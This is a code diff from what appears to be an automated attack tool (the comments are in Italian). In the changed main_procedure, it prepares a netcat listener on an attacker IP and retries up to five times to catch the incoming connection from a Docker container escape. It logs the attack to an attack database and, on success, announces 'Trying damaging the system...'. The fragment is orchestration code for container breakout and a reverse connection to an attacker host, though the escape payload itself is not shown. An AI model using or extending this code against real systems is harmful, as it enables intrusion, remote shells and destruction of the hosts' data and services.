@@ -142,9 +142,20 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
 
+                        sess={}
+                        for i in range (0,5):
+                            success =mc.grab_docker_escape_conn()
+                            if success:
+                                Logger.log(mc, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
+                                sess["escape_sess"]=success
+                                break
+                            else:
+                                Logger.log(mc, f"can't establish connection from netcat attempt {i} -", level=Logger.ERROR)
+
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                        escape=mc.docker_escape(atk_sess)
+
+                        escape=sess
                         if(escape):
                             print(escape)
                             print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
